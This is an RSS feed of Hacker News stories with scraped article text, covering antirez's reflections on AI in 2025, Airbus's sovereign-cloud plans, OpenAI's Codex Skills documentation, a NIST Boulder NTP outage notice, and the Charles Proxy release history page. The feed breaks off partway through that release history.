<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sat, 20 Dec 2025 16:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Reflections on AI at the End of 2025 (102 pts)]]></title>
            <link>https://antirez.com/news/157</link>
            <guid>46334819</guid>
            <pubDate>Sat, 20 Dec 2025 09:38:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://antirez.com/news/157">https://antirez.com/news/157</a>, See on <a href="https://news.ycombinator.com/item?id=46334819">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content">
<section id="newslist"><article data-news-id="157"></article></section><topcomment><article data-comment-id="157-" id="157-"><span><span><a href="https://antirez.com/user/antirez">antirez</a></span> 7 hours ago. 24344 views.  </span><pre>* For years, despite functional evidence and scientific hints accumulating, certain AI researchers continued to claim LLMs were stochastic parrots: probabilistic machines that would: 1. NOT have any representation about the meaning of the prompt. 2. NOT have any representation about what they were going to say. In 2025 finally almost everybody stopped saying so.

* Chain of thought is now a fundamental way to improve LLM output. But, what is CoT? Why it improves output? I believe it is two things: 1. Sampling in the model representations (that is, a form of internal search). After information and concepts relevant to the prompt topic is in the context window, the model can better reply. 2. But if you mix this to reinforcement learning, the model also learns to put one token after the other (each token will change the model state) in order to converge to some useful reply.

* The idea that scaling is limited to the number of tokens we have, is no longer true, because of reinforcement learning with verifiable rewards. We are still not at AlphaGo move 37 moment, but is this really impossible in the future? There are certain tasks, like improving a given program for speed, for instance, where in theory the model can continue to make progress with a very clear reward signal for a very long time. I believe improvements to RL applied to LLMs will be the next big thing in AI.

* Programmers resistance to AI assisted programming has lowered considerably. Even if LLMs make mistakes, the ability of LLMs to deliver useful code and hints improved to the point most skeptics started to use LLMs anyway: now the return on the investment is acceptable for many more folks. The programming world is still split among who uses LLMs as colleagues (for instance, all my interaction is via the web interface of Gemini, Claude, …), and who uses LLMs as independent coding agents.

* A few well known AI scientists believe that what happened with Transformers can happen again, and better, following different paths, and started to create teams, companies to investigate alternatives to Transformers and models with explicit symbolic representations or world models. I believe that LLMs are differentiable machine trained on a space able to approximate discrete reasoning steps, and it is not impossible they get us to AGI even without fundamentally new paradigms appearing. It is likely that AGI can be reached independently with many radically different architectures.

* There is who says chain of thought changed LLMs nature fundamentally, and this is why they, in the past, claimed LLMs were very limited, and now are changing their mind. They say, because of CoT, LLMs are now a different thing. They are lying. It is still the same architecture with the same next token target, and the CoT is created exactly like that, token after token.

* The ARC test today looks a lot less insurmountable than initially thought: there are small models optimized for the task at hand that perform decently well on ARC-AGI-1, and very large LLMs with extensive CoT achieving impressive results on ARC-AGI-2 with an architecture that, according to many folks, would not deliver such results. ARC, in some way, transitioned from being the anti-LLM test to a validation of LLMs.

* The fundamental challenge in AI for the next 20 years is avoiding extinction.</pre></article></topcomment>


<p><a href="https://disqus.com/">blog comments powered by <span>Disqus</span></a>

</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Airbus to migrate critical apps to a sovereign Euro cloud (318 pts)]]></title>
            <link>https://www.theregister.com/2025/12/19/airbus_sovereign_cloud/</link>
            <guid>46334533</guid>
            <pubDate>Sat, 20 Dec 2025 08:36:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2025/12/19/airbus_sovereign_cloud/">https://www.theregister.com/2025/12/19/airbus_sovereign_cloud/</a>, See on <a href="https://news.ycombinator.com/item?id=46334533">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p><span>Exclusive</span> Airbus is preparing to tender a major contract to migrate mission-critical workloads to a digitally sovereign European cloud – but estimates only an 80/20 chance of finding a suitable provider.</p>
<div><p><img src="https://regmedia.co.uk/2016/11/25/airbus_a350_1000.jpg?x=174&amp;amp;y=115&amp;amp;crop=1" width="174" height="115" alt="Airbus A350-1000"></p><h2 title="Google Workspace switch drags on amid Excel dependencies, compliance requirements, and compatibility issues">Seven years later, Airbus is still trying to kick its Microsoft habit</h2>
<p><a href="https://www.theregister.com/2025/11/26/microsoft_airbus_migration/"><span>READ MORE</span></a></p></div>
<p>The aerospace manufacturer, which has already consolidated its datacenter estate and uses services like Google Workspace, now wants to move key on-premises applications including ERP, manufacturing execution systems, CRM, and product lifecycle management (aircraft designs) to the cloud.</p>
<p>"I need a sovereign cloud because part of the information is extremely sensitive from a national and European perspective," Catherine Jestin, Airbus's executive vice president of digital, told <em>The Register</em>. "We want to ensure this information remains under European control."</p>
<p>The driver is access to new software. Vendors like <a target="_blank" href="https://www.theregister.com/2023/08/03/sap_ceo_push_for_cloudonly/">SAP are developing innovations exclusively in the cloud</a>, pushing customers toward platforms like S/4HANA.</p>
<p>The request for proposals launches in early January, with a decision expected before summer. The contract – understood to be worth more than €50 million – will be long term (up to ten years), with price predictability over the period.</p>

    

<p>Digital sovereignty has become more critical since Donald Trump's return to the White House in January. His policies created <a target="_blank" href="https://www.theregister.com/2025/04/30/microsoft_getting_nervous_about_europes/">volatility in trade and geopolitical relations</a>, prompting <a target="_blank" href="https://www.theregister.com/2025/03/17/european_tech_sovereign_fund/">European customers to reduce reliance on US providers</a>.</p>

        


        

<p>While <a target="_blank" href="https://www.theregister.com/2025/11/07/microsoft_announces_strengthening_of_sovereignty/">Microsoft</a>, <a target="_blank" href="https://www.theregister.com/2025/06/03/aws_european_sovereign_cloud/">AWS</a>, and <a target="_blank" href="https://www.theregister.com/2025/05/21/google_sovereign_cloud_updates/">Google</a> have created solutions to address these concerns, fears persist about the US CLOUD Act, which allows authorities to request data held by American corporations in overseas datacenters.</p>
<ul>

<li><a href="https://www.theregister.com/2025/11/27/canada_court_ovh/">Canadian data order risks blowing a hole in EU sovereignty</a></li>

<li><a href="https://www.theregister.com/2025/11/24/nato_google_cloud/">NATO taps Google for air-gapped sovereign cloud</a></li>

<li><a href="https://www.theregister.com/2025/11/19/microsoft_sap_cloud_crisis/">Microsoft-SAP pact aims to keep Euro cloud running in a crisis</a></li>

<li><a href="https://www.theregister.com/2025/11/10/three_most_important_factors_in/">Big Tech's control freak era is breaking itself apart</a></li>
</ul>
<p>Microsoft admitted in French court last July it <a target="_blank" href="https://www.theregister.com/2025/07/25/microsoft_admits_it_cannot_guarantee/">couldn't guarantee data sovereignty</a> under this legislation.</p>
<p>Jestin is waiting for European regulators to clarify whether Airbus would truly be "immune to extraterritorial laws" – and whether services could be interrupted.</p>
<div><p><img src="https://regmedia.co.uk/2020/12/21/shutterstock_cloud_migration.jpg?x=174&amp;amp;y=115&amp;amp;crop=1" width="174" height="115" alt="Cloud migration"></p><h2 title="Aerospace giant faces 'massive work' to move legacy ERP systems to S/4HANA as support deadline looms">Airbus exec: Most CIOs in Europe will not finish SAP ECC6 migration by 2030</h2>
<p><a href="https://www.theregister.com/2025/12/11/airbus_exec_sap/"><span>READ MORE</span></a></p></div>
<p>The concern isn't theoretical. Chief Prosecutor of the International Criminal Court (ICC) Karim Khan reportedly <a target="_blank" href="https://www.theregister.com/2025/10/31/international_criminal_court_ditches_office/">lost access to his Microsoft email</a> after Trump sanctioned him for criticizing Israeli PM Benjamin Netanyahu, though Microsoft denies suspending ICC services.</p>
<p>Beyond US complications, Jestin questions whether European cloud providers have sufficient scale. "If you asked me today if we'll find a solution, I'd say 80/20."</p>
<p>This puts pressure on European providers to collaborate, though whether they can navigate such complexities in Airbus's timeframe remains uncertain. ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Skills Officially Comes to Codex (134 pts)]]></title>
            <link>https://developers.openai.com/codex/skills/</link>
            <guid>46334424</guid>
            <pubDate>Sat, 20 Dec 2025 08:09:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://developers.openai.com/codex/skills/">https://developers.openai.com/codex/skills/</a>, See on <a href="https://news.ycombinator.com/item?id=46334424">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="mainContent"> <p>Agent Skills let you extend Codex with task-specific capabilities. A skill packages instructions, resources, and optional scripts so Codex can perform a specific workflow reliably. You can share skills across teams or the community, and they build on the <a href="http://agentskills.io/">open Agent Skills standard</a>.</p>
<p>Skills are available in both the Codex CLI and IDE extensions.</p>

<p>A skill captures a capability expressed through markdown instructions inside a <code>SKILL.md</code> file accompanied by optional scripts, resources, and assets that Codex uses to perform a specific task.</p>
<div data-astro-cid-cy6iooep="" data-file-tree=""> <ul role="tree" data-astro-cid-cy6iooep=""> <li data-depth="0" data-last="true" data-astro-cid-cy6iooep=""> <details open="" aria-label="my-skill/ directory" data-astro-cid-cy6iooep=""> <summary data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M8.293 4.293a1 1 0 0 1 1.414 0l7 7a1 1 0 0 1 0 1.414l-7 7a1 1 0 0 1-1.414-1.414L14.586 12 8.293 5.707a1 1 0 0 1 0-1.414Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> my-skill/ </span> </span>  </summary> <div data-astro-cid-cy6iooep=""> <ul role="group" data-astro-cid-cy6iooep=""> <li data-depth="1" data-astro-cid-cy6iooep=""> <p><span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M8 3.51v12.222c1.1.372 2.146 1.062 3 1.941V7.211c-.31-1.455-1.524-2.948-3-3.7Zm5 4.728v11.578c.767-.38 1.51-.68 2.287-.908 1.27-.372 2.585-.533 4.187-.558V6.514c-2.68.088-4.281.55-6.474 1.724ZM9.757 19.272c-.663-.745-1.513-1.348-2.406-1.648A1.987 1.987 0 0 1 6 15.738v-9.08a11.37 11.37 0 0 0-1.535-.143h-.004l-.002.001-.004.002V18.35c2.105.033 3.7.303 5.3.922ZM6 4.635V3.512c0-1.411 1.495-2.493 2.866-1.805 1.742.873 3.269 2.533 3.901 4.402 2.119-1.046 3.93-1.506 6.658-1.594 1.142-.037 2.05.895 2.05 1.999v11.837a1.996 1.996 0 0 1-1.96 1.999c-1.485.022-2.614.17-3.666.477-1.055.31-2.079.792-3.342 1.535a1 1 0 0 1-1.014 0c-2.465-1.45-4.169-1.968-7.078-2.012a1.995 1.995 0 0 1-1.959-1.998V6.515c0-1.147.958-2.036 2.077-1.998.601.02 1.045.06 1.467.118Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> SKILL.md </span> </span> <span data-astro-cid-cy6iooep=""> Required: instructions + metadata </span> </p> </li><li data-depth="1" data-astro-cid-cy6iooep=""> <p><span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M2 6a3 3 0 0 1 3-3h4.172a3 3 0 0 1 2.12.879l.83.828a1 1 0 0 0 .706.293H19a3 3 0 0 1 3 3v10a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V6Zm3-1a1 1 0 0 0-1 1v4h16V8a1 1 0 0 0-1-1h-6.172a3 3 0 0 1-2.12-.879l-.83-.828A1 1 0 0 0 9.173 5H5Zm15 7H4v6a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-6Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> scripts/ </span> </span> <span data-astro-cid-cy6iooep=""> Optional: executable code </span> </p> </li><li data-depth="1" data-astro-cid-cy6iooep=""> <p><span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M2 6a3 3 0 0 1 3-3h4.172a3 3 0 0 1 2.12.879l.83.828a1 1 0 0 0 .706.293H19a3 3 0 0 1 3 3v10a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V6Zm3-1a1 1 0 0 0-1 1v4h16V8a1 1 0 0 0-1-1h-6.172a3 3 0 0 1-2.12-.879l-.83-.828A1 1 0 0 0 9.173 5H5Zm15 7H4v6a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-6Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> references/ </span> </span> <span data-astro-cid-cy6iooep=""> Optional: documentation </span> </p> </li><li data-depth="1" data-last="true" data-astro-cid-cy6iooep=""> <p><span data-astro-cid-cy6iooep=""> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24" data-astro-cid-cy6iooep="true"><path fill-rule="evenodd" d="M2 6a3 3 0 0 1 3-3h4.172a3 3 0 0 1 2.12.879l.83.828a1 1 0 0 0 .706.293H19a3 3 0 0 1 3 3v10a3 3 0 0 1-3 3H5a3 3 0 0 1-3-3V6Zm3-1a1 1 0 0 0-1 1v4h16V8a1 1 0 0 0-1-1h-6.172a3 3 0 0 1-2.12-.879l-.83-.828A1 1 0 0 0 9.173 5H5Zm15 7H4v6a1 1 0 0 0 1 1h14a1 1 0 0 0 1-1v-6Z" clip-rule="evenodd"></path></svg> </span> <span data-astro-cid-cy6iooep=""> <span data-astro-cid-cy6iooep=""> assets/ </span> </span> <span data-astro-cid-cy6iooep=""> Optional: templates, resources </span> </p> </li> </ul> </div> </details> </li> </ul> </div> 
<p>Skills use <strong>progressive disclosure</strong> to manage context efficiently. At startup, Codex loads the name and description of each available skill. Codex can then activate and use a skill in two ways:</p>
<ol>
<li><strong>Explicit invocation:</strong> You can include skills directly as part of your prompt. To select one, run the <code>/skills</code> slash command, or start typing <code>$</code> to mention a skill. (Codex web and iOS don’t support explicit invocation yet, but you can still prompt Codex to use any skill checked into the repo.)</li>
</ol>

<ol start="2">
<li><strong>Implicit invocation:</strong> Codex can decide to use an available skill when the user’s task matches the skill’s description.</li>
</ol>
<p>In either method, Codex reads the full instructions of the invoked skills and any extra references checked into the skill.</p>

<p>Codex loads skills from these locations. A skill’s location defines its scope.</p>
<p>When Codex loads available skills from these locations, it overwrites skills with the same name from a scope of lower precedence. The list below shows skill scopes and locations in order of precedence (high to low):</p>








































<div><table><thead><tr><th>Skill Scope</th><th>Location</th><th>Suggested Use</th></tr></thead><tbody><tr><td><code>REPO</code></td><td><code>$CWD/.codex/skills</code> <br> Current Working Directory: where you launch Codex.</td><td>If in a repository or code environment, teams can check in skills most relevant to a working folder here. For instance, skills only relevant to a microservice or a code module.</td></tr><tr><td><code>REPO</code></td><td><code>$CWD/../.codex/skills</code> <br> A folder above CWD when you launch Codex inside a git repository.</td><td>If in a repository with nested folders, organizations can check in skills most relevant to a shared area in a parent folder.</td></tr><tr><td><code>REPO</code></td><td><code>$REPO_ROOT/.codex/skills</code> <br> The top-most root folder when you launch Codex inside a git repository.</td><td>If in a repository with nested folders, organizations can check in skills that are relevant to everyone using the repository. These serve as root skills that any subfolder in the repository can overwrite.</td></tr><tr><td><code>USER</code></td><td><code>$CODEX_HOME/skills</code> <br> <small>(Mac/Linux default: <code>~/.codex/skills</code>)</small> <br> Any skills checked into the user’s personal folder.</td><td>Use to curate skills relevant to a user that apply to any repository the user may work in.</td></tr><tr><td><code>ADMIN</code></td><td><code>/etc/codex/skills</code> <br> Any skills checked into the machine or container in a shared, system location.</td><td>Use for SDK scripts, automation, and for checking in default admin skills available to each user on the machine.</td></tr><tr><td><code>SYSTEM</code></td><td>Bundled with Codex.</td><td>Useful skills relevant to a broad audience such as the skill-creator and plan skills. Available to everyone when they start Codex and can be overwritten by any layer above.</td></tr></tbody></table></div>

<p>To create a new skill, use the built-in <code>$skill-creator</code> skill inside Codex. Describe what you want your skill to do, and Codex will start bootstrapping your skill. If you combine it with the <code>$plan</code> skill, Codex will first create a plan for your skill.</p>
<p>You can also create a skill manually by creating a folder with a <code>SKILL.md</code> file inside a valid skill location. A <code>SKILL.md</code> must contain a <code>name</code> and <code>description</code> to help Codex select the skill:</p>
<pre tabindex="0" data-language="md"><code><span><span>---</span></span>
<span><span>name: skill-name</span></span>
<span><span>description: Description that helps Codex select the skill</span></span>
<span><span>metadata:</span></span>
<span><span>  short-description: Optional user-facing description</span></span>
<span><span>---</span></span>
<span></span>
<span><span>Skill instructions for the Codex agent to follow when using this skill.</span></span></code></pre>
<p>Codex skills build on the <a href="https://agentskills.io/specification">Agent Skills specification</a>. Check out the documentation to learn more.</p>

<p>To expand on the list of built-in skills, you can download skills from a <a href="https://github.com/openai/skills">curated set of skills on GitHub</a> using the <code>$skill-installer</code> skill:</p>
<pre tabindex="0" data-language="plaintext"><code><span><span>$skill-installer linear</span></span></code></pre>
<p>You can also prompt the installer to download skills from other repositories.</p>

<h3 id="plan-a-new-feature"><span>Plan a new feature</span></h3>
<p>Codex ships with a built-in <code>$plan</code> skill that’s great to have Codex research and create a plan to build a new feature or solve a complex problem.</p>
<h3 id="access-linear-context-for-codex-tasks"><span>Access Linear context for Codex tasks</span></h3>
<pre tabindex="0" data-language="plaintext"><code><span><span>$skill-installer linear</span></span></code></pre>

<h3 id="have-codex-access-notion-for-more-context"><span>Have Codex access Notion for more context</span></h3>
<pre tabindex="0" data-language="plaintext"><code><span><span>$skill-installer notion-spec-to-implementation</span></span></code></pre>
  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NTP at NIST Boulder Has Lost Power (285 pts)]]></title>
            <link>https://lists.nanog.org/archives/list/nanog@lists.nanog.org/message/ACADD3NKOG2QRWZ56OSNNG7UIEKKTZXL/</link>
            <guid>46334299</guid>
            <pubDate>Sat, 20 Dec 2025 07:39:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lists.nanog.org/archives/list/nanog@lists.nanog.org/message/ACADD3NKOG2QRWZ56OSNNG7UIEKKTZXL/">https://lists.nanog.org/archives/list/nanog@lists.nanog.org/message/ACADD3NKOG2QRWZ56OSNNG7UIEKKTZXL/</a>, See on <a href="https://news.ycombinator.com/item?id=46334299">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="thread-content">

     <!-- /email-header: gravatar, author-info, date, peramlink, changed_subject -->
    <p>reposting from the Internet time service list


jeff.s...@nist.gov &lt;jeff.sherman@nist.gov&gt;: Dec 19 05:18PM -0800

Dear colleagues,

In short, the atomic ensemble time scale at our Boulder campus has failed
due to a prolonged utility power outage. One impact is that the Boulder
Internet Time Services no longer have an accurate time reference. At time
of writing the Boulder servers are still available due a standby power
generator, but I will attempt to disable them to avoid disseminating
incorrect time.

The affected servers are:
time-a-b.nist.gov
time-b-b.nist.gov
time-c-b.nist.gov
time-d-b.nist.gov
time-e-b.nist.gov
ntp-b.nist.gov (authenticated NTP)

No time to repair estimate is available until we regain staff access and
power. Efforts are currently focused on obtaining an alternate source of
power so the hydrogen maser clocks survive beyond their battery backups.

More details follow.

Due to prolonged high wind gusts there have been a combination of utility
power line damage and preemptive utility shutdowns (in the interest of
wildfire prevention) in the Boulder, CO area. NIST's campus lost utility
power Wednesday (Dec. 17 2025) around 22:23 UTC. At time of writing utility
power is still off to the campus. Facility operators anticipated needing to
shutdown the heat-exchange infrastructure providing air cooling to many
parts of the building, including some internal networking closets. As a
result, many of these too were preemptively shutdown with the result that
our group lacks much of the monitoring and control capabilities we
ordinarily have. Also, the site has been closed to all but emergency
personnel Thursday and Friday, and at time of writing remains closed.

At initial power loss, there was no immediate impact to the NIST atomic
time scale or distribution services because the projects are afforded
standby power generators. However, we now have strong evidence one of the
crucial generators has failed. In the downstream path is the primary signal
distribution chain, including to the Boulder Internet Time Service. Another
campus building houses additional clocks backed up by a different power
generator; if these survive it will allow us to re-align the primary time
scale when site stability returns without making use of external clocks or
reference signals.

Best wishes,
-Jeff Sherman
project email: internet-time-service@nist.gov

AnneJ (watching from Edinburgh, UK)</p>

    

    

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Privacy doesn't mean anything anymore, anonymity does (219 pts)]]></title>
            <link>https://servury.com/blog/privacy-is-marketing-anonymity-is-architecture/</link>
            <guid>46334025</guid>
            <pubDate>Sat, 20 Dec 2025 06:21:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://servury.com/blog/privacy-is-marketing-anonymity-is-architecture/">https://servury.com/blog/privacy-is-marketing-anonymity-is-architecture/</a>, See on <a href="https://news.ycombinator.com/item?id=46334025">Hacker News</a></p>
Couldn't get https://servury.com/blog/privacy-is-marketing-anonymity-is-architecture/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Charles Proxy (231 pts)]]></title>
            <link>https://www.charlesproxy.com/</link>
            <guid>46333983</guid>
            <pubDate>Sat, 20 Dec 2025 06:09:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.charlesproxy.com/">https://www.charlesproxy.com/</a>, See on <a href="https://news.ycombinator.com/item?id=46333983">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
						
							
		<dt>11 Jun 2023</dt>
	


<dd><p>Charles 5 public beta 9 is now available for testing, featuring more UI improvements and bug fixes. <span><a href="https://www.charlesproxy.com/download/beta/">Read more.</a></span></p></dd>
						
							
		<dt>11 Apr 2023</dt>
	


<dd><p>Charles 5 public beta is now available for testing, featuring major UI improvements and technology upgrades. <span><a href="https://www.charlesproxy.com/download/beta/">Read more.</a></span></p></dd>
						
							
		<dt>4 Apr 2023</dt>
	


<dd><p>Charles 4.6.4 released with macOS crash fixed and Windows code signing updated. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>26 Sep 2022</dt>
	


<dd><p>Charles 4.6.3 released with minor bug fixes and Java 11 update <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>14 Dec 2021</dt>
	


<dd><p>In light of the current log4j2 vulnerabilities, we confirm that no version of Charles shipped or used any version of log4j and Charles is therefore thankfully unaffected by this issue. Our best wishes to the log4j developers and everyone affected by this.</p></dd>
						
							
		<dt>6 Jul 2021</dt>
	


<dd><p>Charles 4.6.2 released including bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>15 Nov 2020</dt>
	


<dd><p>Charles 4.6.1 released to fix Dark Mode support on macOS <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>7 Nov 2020</dt>
	


<dd><p>Charles 4.6 released including new features and stability improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>15 Jan 2020</dt>
	


<dd><p>Charles 4.5.6 released with minor bug fixes and patched security vulnerability. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>5 Dec 2019</dt>
	


<dd><p>Charles 4.5.5 released including bug fixes for SSL certificate imports. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>3 Nov 2019</dt>
	


<dd><p>Charles 4.5.2 released including new features, bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>28 Feb 2019</dt>
	


<dd><p>Charles 4.2.8 released with minor bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>14 Sep 2018</dt>
	


<dd><p>Charles 4.2.7 released with minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>5 May 2018</dt>
	


<dd><p>Charles Security Bulletin for a local privilege escalation in Charles 4.2 and 3.12.1 and earlier. <span><a href="https://www.charlesproxy.com/documentation/security/">Read more.</a></span></p></dd>
						
							
		<dt>7 Apr 2018</dt>
	


<dd><p>Charles 4.2.5 released with major bug fixes and minor improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>28 Mar 2018</dt>
	


<dd><p>Charles for iOS released. <span><a href="https://www.charlesproxy.com/ios/">Read more.</a></span></p></dd>
						
							
		<dt>22 Nov 2017</dt>
	


<dd><p>Charles 4.2.1 released with important bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>30 Sep 2017</dt>
	


<dd><p>Charles 4.2 released with major new TLS debugging capability, minor improvements and bug fixes including macOS High Sierra support. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>10 Jul 2017</dt>
	


<dd><p>Charles 4.1.4 released with minor improvements and bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>20 Jun 2017</dt>
	


<dd><p>Charles 4.1.3 released including Brotli compression support and other minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>13 May 2017</dt>
	


<dd><p>Charles 4.1.2 released with bug fixes and minor improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>21 Apr 2017</dt>
	


<dd><p>Charles 4.1.1 released with bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>10 Apr 2017</dt>
	


<dd><p>Charles 4.1 released including major new features and bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>19 Nov 2016</dt>
	


<dd><p>Charles 4.0.2 released including bug fixes and minor improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>20 Sep 2016</dt>
	


<dd><p>Charles 4.0.1 released including bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>16 Sep 2016</dt>
	


<dd><p>Charles 3.11.6 released with support for macOS Sierra and minor bug fixes. <span><a href="https://www.charlesproxy.com/download/previous-release/">Read more.</a></span></p></dd>
						
							
		<dt>1 Aug 2016</dt>
	


<dd><p>Charles 4 released featuring HTTP 2, IPv6 and improved look and feel. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>29 May 2016</dt>
	


<dd><p>Charles 3.11.5 released including minor bug fixes; especially fixes SSL certificate installation on Android. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>29 Feb 2016</dt>
	


<dd><p>Charles 3.11.4 released with support for ATS on iOS 9 and crash fixes for older versions of Mac OS X. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>15 Feb 2016</dt>
	


<dd><p>Charles v3.11.3 released including bug fixes and minor improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>9 Nov 2015</dt>
	


<dd><p>Charles v3.11.2 released with SSL and Websockets improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>4 Oct 2015</dt>
	


<dd><p>Charles 3.11 released including major new features. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>7 Jul 2015</dt>
	


<dd><p>Charles 3.10.2 released with bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>31 Mar 2015</dt>
	


<dd><p>Charles 3.10.1 released with minor bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>21 Mar 2015</dt>
	


<dd><p>Charles 3.10 released with improved SSL (new SSL CA certificate install required), major new features and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>22 Oct 2014</dt>
	


<dd><p>Charles v3.9.3 released with improvements to SSL support, Mac OS X Yosemite support and other minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>26 May 2014</dt>
	


<dd><p>Charles v3.9.2 released with minor bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>5 May 2014</dt>
	


<dd><p>Charles 3.9.1 released with minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>25 Apr 2014</dt>
	


<dd><p>Charles 3.9 released with major new features and bug fixes, including the ability to "focus" on hosts so they are separated from the noise. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>23 Oct 2013</dt>
	


<dd><p>Charles 3.8.3 released with support for Mac OS X Mavericks and minor bug fixes. Happy Mavericks Day. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>21 Oct 2013</dt>
	


<dd><p>Charles 3.8.2 released with minor bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>9 Sep 2013</dt>
	


<dd><p>Charles 3.8.1 released with minor bug fixes and improvements. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>4 Sep 2013</dt>
	


<dd><p>Charles 3.8 has been released with new features and bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
		<dt>12 Feb 2013</dt>
	


<dd><p>Charles 3.7 has been released. Includes new features, bundled Java runtime (so you don’t need to install Java anymore), and bug fixes. <span><a href="https://www.charlesproxy.com/download/">Read more.</a></span></p></dd>
						
							
